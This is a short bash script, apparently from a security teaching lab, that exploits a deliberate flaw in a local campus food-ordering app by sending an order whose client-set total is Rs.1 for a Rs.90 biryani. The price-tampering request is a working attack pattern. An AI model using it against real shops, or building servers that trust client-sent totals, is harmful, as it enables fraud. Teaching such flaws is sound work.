#!/usr/bin/env bash
# BUG-03 — who decides what the biryani costs?
# The cart total travels from the browser to the server. Send a "generous" one.
#
# Safe to run repeatedly: it restocks, tops the wallet up and frees the
# student's order slots first, so a previous run can't confuse this one.

API=http://localhost:8080
STUDENT=3

# --- reset ---------------------------------------------------------------
curl -s -o /dev/null -X PUT "$API/api/admin/dishes/1/stock" \
  -H 'Content-Type: application/json' -d '{"stock":3}'
curl -s -o /dev/null -X POST "$API/api/wallet/$STUDENT/topup" \
  -H 'Content-Type: application/json' -d '{"amountRupees":1000}'
for id in $(curl -s "$API/api/orders?studentId=$STUDENT" \
              | grep -oE '"orderId":[0-9]+' | grep -oE '[0-9]+'); do
  curl -s -o /dev/null -X POST "$API/api/orders/$id/cancel"
done
# -------------------------------------------------------------------------

BEFORE=$(curl -s "$API/api/wallet/$STUDENT" | grep -o '"balanceRupees":[0-9]*' | cut -d: -f2)

curl -s "$API/api/orders" \
  -H 'Content-Type: application/json' \
  -d '{
    "studentId": '"$STUDENT"',
    "pickupBlock": "Block C",
    "totalRupees": 1,
    "items": [ { "dishId": 1, "quantity": 1 } ]
  }'
echo

AFTER=$(curl -s "$API/api/wallet/$STUDENT" | grep -o '"balanceRupees":[0-9]*' | cut -d: -f2)
echo
echo "The menu says a Hyderabadi Biryani is Rs.90."
echo "Wallet: Rs.$BEFORE  ->  Rs.$AFTER"
echo "Read the receipt above, then subtract. Who decided that number?"
